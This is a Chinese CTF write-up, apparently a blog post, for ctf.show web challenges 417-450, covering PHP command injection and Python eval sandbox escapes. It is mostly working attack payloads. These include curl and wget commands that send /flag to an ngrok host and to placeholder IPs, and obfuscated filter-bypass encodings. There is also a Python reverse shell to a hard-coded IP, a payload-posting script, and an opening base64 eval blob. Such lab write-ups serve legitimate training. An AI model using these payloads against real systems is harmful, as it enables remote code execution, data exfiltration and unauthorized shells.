VXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;)); ?&gt;
</code></pre>
<p>调试一下</p>
<pre><code class="php">include(&#39;flag.php&#39;);
$c=$_GET[&#39;ctf&#39;];
if($c==&#39;show&#39;)&#123;
    echo $flag;
&#125;else&#123;
    echo &#39;FLAG_NOT_HERE&#39;;
&#125;
?&gt;
</code></pre>
<h1 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h1><pre><code class="php">
 &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-26 23:52:58
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
$key= 0;
$clear=&#39;clear.php&#39;;
highlight_file(__FILE__);

//获取参数
$ctfshow=$_GET[&#39;ctfshow&#39;];
//包含清理脚本
include($clear);


extract($_POST);
if($key===0x36d)&#123;
    //帮黑阔写好后门
    eval(&#39;&lt;?php &#39;.$ctfshow.&#39;?&gt;&#39;);
&#125;else&#123;
    $die?die(&#39;FLAG_NOT_HERE&#39;):clear($clear);
&#125;


function clear($log)&#123;
    shell_exec(&#39;rm -rf &#39;.$log);
&#125;


Notice: Undefined index: ctfshow in /var/www/html/index.php on line 18
FLAG_NOT_HERE
</code></pre>
<p>注意代码</p>
<p>给的后门没法用，需要变量覆盖然后利用shell_exec</p>
<pre><code class="php">die=0&amp;clear=;cp flag.php flag.txt
</code></pre>
<p>然后访问flag.txt即可</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141929631.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415141929631"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141935770.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415141935770"></p>

<h1 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h1><pre><code class="php">
 &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-29 01:36:24
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


highlight_file(__FILE__);


$code = $_POST[&#39;code&#39;];
if(strlen($code) &lt; 17)&#123;
    eval($code);
&#125;

Notice: Undefined index: code in /var/www/html/index.php on line 18
</code></pre>
<pre><code class="php">code=`cp f* f.txt`;
</code></pre>
<pre><code class="php">code=eval($_POST[1]);&amp;1=system(&#39;cat flag.php&#39;);
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415142122553.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415142122553"></p>

<h1 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-29 01:41:05
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


highlight_file(__FILE__);


$code = $_POST[&#39;code&#39;];
if(strlen($code) &lt; 8)&#123;
    system($code);
&#125;

Notice: Undefined index: code in /var/www/html/index.php on line 18

Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20
</code></pre>
<p>ls找了几个目录发现在&#x2F;var&#x2F;www下（ls …&#x2F;）</p>
<pre><code class="php">code=nl ../*
</code></pre>
<p>还有一种方法，可以参考下大佬写的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11981586.html">文章</a><br> 比如我们想执行 cat index.php,可以依次执行如下命令</p>
<pre><code class="php">&gt;php\\
&gt;dex.\\
&gt;\ in\\
&gt;cat\\
</code></pre>
<p>接着执行ls -t &gt;0<br> 这样的话文件0中的内容就是 cat index.php<br> 最后利用sh 0 来执行就可以了</p>
<pre><code class="php">import requests
import time

payload = [
    &#39;&gt;sh &#39;,
    &#39;&gt;ba\\&#39;,
    &#39;&gt;\|\\&#39;,
    &#39;&gt;2\\&#39;,
    &#39;&gt;2x\\&#39;,
    &#39;&gt;xxx.\\&#39;,
    &#39;&gt;9x.\\&#39;,
    &#39;&gt;1\\&#39;,
    &#39;&gt;2.\\&#39;,
    &#39;&gt;4\\&#39;,
    &#39;&gt;\ \\&#39;,
    &#39;&gt;curl\\&#39;,
    # &#39;&gt;cu\\&#39;,
]

for i in payload:
    # assert len(i) &lt;= 8
    data = &#123;
        &#39;code&#39;: str(i)
    &#125;
    r = requests.post(&#39;http://6171141f-4d7c-447c-b0f6-1c92f0abd9be.chall.ctf.show/&#39;, data=data)
    print(i)
    time.sleep(1)

</code></pre>
<h1 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-29 01:42:50
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


highlight_file(__FILE__);


$code = $_POST[&#39;code&#39;];
if(strlen($code) &lt; 6)&#123;
    system($code);
&#125;

Notice: Undefined index: code in /var/www/html/index.php on line 18

Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20
</code></pre>
<pre><code class="php">code=nl *
</code></pre>
<h1 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-29 01:42:50
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


highlight_file(__FILE__);


$code = $_POST[&#39;code&#39;];
if(strlen($code) &lt; 5)&#123;
    system($code);
&#125;

Notice: Undefined index: code in /var/www/html/index.php on line 18

Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20
</code></pre>
<pre><code class="php">code=nl *
</code></pre>
<h1 id="we4b23"><a href="#we4b23" class="headerlink" title="we4b23"></a>we4b23</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415143111800.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415143111800"></p>

<pre><code class="php">
from flask import Flask
from flask import request
import os

app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="php">?code=str(&#39;&#39;.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;curl http://xx.xx.xx.xx?1=`cat /flag`&#39;))
</code></pre>
<p>下面的题都是python的命令执行的，因为下面代码中的return需要返回的是字符串，所以不是字符串的我们就用str函数转换一下就好了。</p>
<pre><code class="破坏p">?code=os.popen(&#39;ls /&#39;).read()
?code=os.popen(&#39;cat /flag&#39;).read()
</code></pre>
<h1 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h1><pre><code class="php">from flask import Flask
from flask import request


app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="跑hp">?code=open(&#39;/flag&#39;).read()
</code></pre>
<h1 id="web425"><a href="#web425" class="headerlink" title="web425"></a>web425</h1><pre><code class="php">from flask import Flask
from flask import request


app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        if &#39;os&#39; not in code:
            return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="php">?code=open(&#39;/flag&#39;).read()
</code></pre>
<h1 id="web426"><a href="#web426" class="headerlink" title="web426"></a>web426</h1><pre><code class="php">from flask import Flask
from flask import request
import re


app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        reg = re.compile(r&#39;os|popen&#39;)
        if reg.match(code)==None:
            return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="php">?code=open(&#39;/flag&#39;).read()
</code></pre>
<h1 id="web427"><a href="#web427" class="headerlink" title="web427"></a>web427</h1><pre><code class="php">from flask import Flask
from flask import request
import re


app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        reg = re.compile(r&#39;os|popen|system&#39;)
        if reg.match(code)==None:
            return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="php">?code=open(&#39;/flag&#39;).read()
</code></pre>
<h1 id="web428"><a href="#web428" class="headerlink" title="web428"></a>web428</h1><pre><code class="php">from flask import Flask
from flask import request
import re


app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        reg = re.compile(r&#39;os|popen|system|read&#39;)
        if reg.match(code)==None:
            return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="php">?code=open(&#39;/flag&#39;).read()
</code></pre>
<h1 id="web429"><a href="#web429" class="headerlink" title="web429"></a>web429</h1><pre><code class="php">from flask import Flask
from flask import request
import re


app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        reg = re.compile(r&#39;os|open|system|read&#39;)
        if reg.match(code)==None:
            return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="php">?code= open(&#39;/flag&#39;).read()
</code></pre>
<p>匹配有问题,前面加个空格</p>
<h1 id="web430"><a href="#web430" class="headerlink" title="web430"></a>web430</h1><pre><code class="php">from flask import Flask
from flask import request
import re


app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        reg = re.compile(r&#39;os|open|system|read|eval&#39;)
        if reg.match(code)==None:
            return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="php">?code= open(&#39;/flag&#39;).read()
</code></pre>
<h1 id="web431"><a href="#web431" class="headerlink" title="web431"></a>web431</h1><pre><code class="php">from flask import Flask
from flask import request
import re


app = Flask(__name__)
@app.route(&#39;/&#39;)
def app_index():
    code = request.args.get(&#39;code&#39;)
    if code:
        reg = re.compile(r&#39;os|open|system|read|eval|str&#39;)
        if reg.match(code)==None:
            return eval(code)
    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;

if __name__==&quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;,port=80)
</code></pre>
<pre><code class="php">?code= open(&#39;/flag&#39;).read()
</code></pre>
<h1 id="web432"><a href="#web432" class="headerlink" title="web432"></a>web432</h1><p>过滤</p>
<pre><code class="php">os|open|system|read|eval
</code></pre>
<pre><code class="php">nc -lvp 80
</code></pre>
<pre><code class="php">?code=str(__builtins__.__dict__[&#39;__impo&#39;%2b&#39;rt__&#39;](&#39;o&#39;%2b&#39;s&#39;).__getattribute__(&#39;syste&#39;%2b&#39;m&#39;)(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;))
</code></pre>
<pre><code class="php">?code=str(&#39;&#39;.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;curl http://xx.xx.xx.xx?1=`cat /flag`&#39;))
</code></pre>
<h1 id="web433"><a href="#web433" class="headerlink" title="web433"></a>web433</h1><p>过滤</p>
<pre><code class="php">os|open|system|read|eval|builtins
</code></pre>
<pre><code class="php">?code=str(__import__(&#39;so&#39;[::-1]).__getattribute__(&#39;syste&#39;%2b&#39;m&#39;)(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;))
</code></pre>
<pre><code class="php">
?code=str(&#39;&#39;.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__[&#39;__buil&#39;&#39;tins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;curl http://xx.xx.xx.xx?1=`cat /flag`&#39;))
</code></pre>
<h1 id="web434"><a href="#web434" class="headerlink" title="web434"></a>web434</h1><pre><code class="php">os|open|system|read|eval|builtins|curl
</code></pre>
<pre><code class="php">?code=str(__import__(&#39;so&#39;[::-1]).__getattribute__(&#39;syste&#39;%2b&#39;m&#39;)(&#39;cu&#39;%2b&#39;rl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;))
</code></pre>
<pre><code class="php">?code=str(&#39;&#39;.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__[&#39;__buil&#39;&#39;tins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;wget http://xx.xx.xx.xx?1=`cat /fl*`&#39;))
</code></pre>
<h1 id="web435"><a href="#web435" class="headerlink" title="web435"></a>web435</h1><p>过滤</p>
<pre><code class="php">os|open|system|read|eval|builtins|curl|_
</code></pre>
<pre><code class="php">?code=str(exec(&#39;import o\x73;o\x73.\x73ystem(\&quot;\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0034\\u0032\\u002e\\u0031\\u0039\\u0032\\u002e\\u0031\\u0033\\u0037\\u002e\\u0032\\u0031\\u0032\\u003f\\u0031\\u003d\\u0060\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0060\&quot;)&#39;))

&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#123;11:c&#125;&#123;12:c&#125;&#123;13:c&#125;&#123;14:c&#125;&#123;15:c&#125;&#123;16:c&#125;&#123;17:c&#125;&#123;18:c&#125;&#123;19:c&#125;&#123;20:c&#125;&#123;21:c&#125;&#123;22:c&#125;&#123;23:c&#125;&#123;24:c&#125;&#123;25:c&#125;&#123;26:c&#125;&#123;27:c&#125;&#123;28:c&#125;&#123;29:c&#125;&#123;30:c&#125;&#123;31:c&#125;&#123;32:c&#125;&#123;33:c&#125;&#123;34:c&#125;&#123;35:c&#125;&#123;36:c&#125;&#123;37:c&#125;&#123;38:c&#125;&#123;39:c&#125;&#123;40:c&#125;&#123;41:c&#125;&#123;42:c&#125;&#123;43:c&#125;&#123;44:c&#125;&#123;45:c&#125;&#123;46:c&#125;&#123;47:c&#125;&#123;48:c&#125;&#123;49:c&#125;&#123;50:c&#125;&#123;51:c&#125;&#123;52:c&#125;&#123;53:c&#125;&#123;54:c&#125;&#123;55:c&#125;&#123;56:c&#125;&#123;57:c&#125;&#123;58:c&#125;&#123;59:c&#125;&#123;60:c&#125;&#123;61:c&#125;&#123;62:c&#125;&quot;.format(105,109,112,111,114,116,32,111,115,59,111,115,46,115,121,115,116,101,109,40,34,99,117,114,108,32,104,116,116,112,58,47,47,52,50,46,49,57,50,46,49,51,55,46,50,49,50,63,49,61,96,99,97,116,32,47,102,108,97,103,96,34,41)

s = &#39;import os;os.system(&quot;curl http://b423-111-17-194-91.ngrok.io:80?1=`cat /flag`&quot;)&#39;
res = &#39;&quot;&#39;
j = 0
for i in s:
    res += (&quot;&#123;&quot;+f&quot;&#123;j&#125;:c&quot;+&quot;&#125;&quot;)
    j += 1
res += &#39;&quot;.format(&#39;
j = 0
for i in s:
    res += f&#39;&#123;ord(i)&#125;,&#39;
    j += 1
res = res[:-1]
res = res+&quot;)&quot;
print(res)
print(eval(res))
</code></pre>
<pre><code class="php">?code=str(exec(&#39;)&quot;`*f/ tac`=p?08:oi.korgn.19-491-71-111-324b//:ptth lruc&quot;(metsys.so ;so tropmi&#39;[::-1]))
</code></pre>
<h1 id="web436-439"><a href="#web436-439" class="headerlink" title="web436-439"></a>web436-439</h1><pre><code class="php">436过滤了os|open|system|read|eval|builtins|curl|_|getattr

437过滤了os|open|system|read|eval|builtins|curl|_|getattr

438过滤了os|open|system|read|eval|builtins|curl|_|getattr|&#123;

439过滤了os|open|system|read|eval|builtins|curl|_|getattr|&#123;
</code></pre>
<pre><code class="php">?code=str(exec(&#39;)&quot;`*f/ tac`=p?08:oi.korgn.19-491-71-111-324b//:ptth lruc&quot;(metsys.so ;so tropmi&#39;[::-1]))
</code></pre>
<h1 id="web440"><a href="#web440" class="headerlink" title="web440"></a>web440</h1><p>过滤了</p>
<pre><code class="php">os|open|system|read|eval|builtins|curl|_|getattr|&#123;|&#39;|&quot;
</code></pre>
<p>没有了引号，我们可以用chr构造字符串</p>
<pre><code class="php">s=&quot;__import__(&#39;os&#39;).system(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;)&quot;
def ccchr(s):
    t=&#39;&#39;
    for i in range(len(s)):
        if i&lt;len(s)-1:
            t+=&#39;chr(&#39;+str(ord(s[i]))+&#39;)%2b&#39;
        else:
            t+=&#39;chr(&#39;+str(ord(s[i]))+&#39;)&#39;
    return t

print(&#39;?code=str(exec(&#39;+ccchr(s)+&#39;))&#39;)
#?code=str(exec(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(115)%2bchr(121)%2bchr(115)%2bchr(116)%2bchr(101)%2bchr(109)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(117)%2bchr(114)%2bchr(108)%2bchr(32)%2bchr(104)%2bchr(116)%2bchr(116)%2bchr(112)%2bchr(58)%2bchr(47)%2bchr(47)%2bchr(98)%2bchr(52)%2bchr(50)%2bchr(51)%2bchr(45)%2bchr(49)%2bchr(49)%2bchr(49)%2bchr(45)%2bchr(49)%2bchr(55)%2bchr(45)%2bchr(49)%2bchr(57)%2bchr(52)%2bchr(45)%2bchr(57)%2bchr(49)%2bchr(46)%2bchr(110)%2bchr(103)%2bchr(114)%2bchr(111)%2bchr(107)%2bchr(46)%2bchr(105)%2bchr(111)%2bchr(58)%2bchr(56)%2bchr(48)%2bchr(63)%2bchr(112)%2bchr(61)%2bchr(96)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(42)%2bchr(96)%2bchr(39)%2bchr(41)))
</code></pre>
<h1 id="web441"><a href="#web441" class="headerlink" title="web441"></a>web441</h1><p>在上面的方法上用request进行了优化</p>
<pre><code class="php">?code=str(exec(request.args.get(chr(97))))&amp;a=__import__(&#39;os&#39;).system(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;)
</code></pre>
<pre><code class="php">str().join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(32),chr(111),chr(115),chr(59),chr(111),chr(115),chr(46),chr(115),chr(121),chr(115),chr(116),chr(101),chr(109),chr(40),chr(34),chr(99),chr(117),chr(114),chr(108),chr(32),chr(104),chr(116),chr(116),chr(112),chr(58),chr(47),chr(47),chr(52),chr(50),chr(46),chr(49),chr(57),chr(50),chr(46),chr(49),chr(51),chr(55),chr(46),chr(50),chr(49),chr(50),chr(63),chr(49),chr(61),chr(96),chr(99),chr(97),chr(116),chr(32),chr(47),chr(102),chr(108),chr(97),chr(103),chr(96),chr(34),chr(41)])
</code></pre>
<h1 id="web442"><a href="#web442" class="headerlink" title="web442"></a>web442</h1><p>过滤了数字</p>
<pre><code class="php">?code=str(exec(request.args.get(request.method)))&amp;GET=__import__(&#39;os&#39;).system(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;)
</code></pre>
<pre><code class="php">exec(request.args.get(str(None)))&amp;None=import os;os.system(&quot;curl http://xx.xx.xx.xx?1=`cat /flag`&quot;)
当然可以构造数字hh
print((len(str(None))*len(str(None))*len(str(None))+len(str(None))))
print(chr(68))
</code></pre>
<h1 id="web443"><a href="#web443" class="headerlink" title="web443"></a>web443</h1><pre><code class="php">def getNumber3(number):
    number = int(number)
    if number in [-2, -1, 0, 1]:
        return [&quot;~int((len(str(None))/len(str(None))))&quot;, &quot;~int(len(str()))&quot;,
                &quot;int(len(str()))&quot;, &quot;int((len(str(None))/len(str(None))))&quot;][number + 2]

    if number % 2:
        return &quot;~%s&quot; % getNumber3(~number)
    else:
        return &quot;(%s&lt;&lt;(int((len(str(None))/len(str(None))))))&quot; % getNumber3(number / 2)

s = &#39;import os;os.system(&quot;curl http://b423-111-17-194-91.ngrok.io:80?1=`cat /flag`&quot;)&#39;
res = &#39;str().join([&#39;
for i in s:
    res += f&quot;chr(&#123;getNumber3(ord(i))&#125;),&quot;
res = res[:-1]
res += &#39;])&#39;
print(res)
</code></pre>
<pre><code class="php">get:POST=import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.13.43&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);

code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))
</code></pre>
<h1 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-03 22:57:52
 Last Modified by:   h1xa
 Last Modified time: 2021-02-04 14:28:30
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
$ctfshow=$_GET[&#39;ctfshow&#39;];


if(preg_match(&#39;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#39;, $ctfshow))&#123;
    eval(&quot;($ctfshow)();&quot;);
&#125;


Notice: Undefined index: ctfshow in /var/www/html/index.php on line 15
</code></pre>
<pre><code class="php">?ctfshow=phpinfo^phpinfo^phpinfo
</code></pre>
<pre><code class="php">&lt;?php
$a =  &#39;phpanfo&#39;^&#39;phpznfo&#39;^&#39;phprnfo&#39;;
echo $a.&quot;\n&quot;;
$a = &#39;a&#39;^&#39;z&#39;^&#39;r&#39;;
echo $a;
#phpinfo
#i
</code></pre>
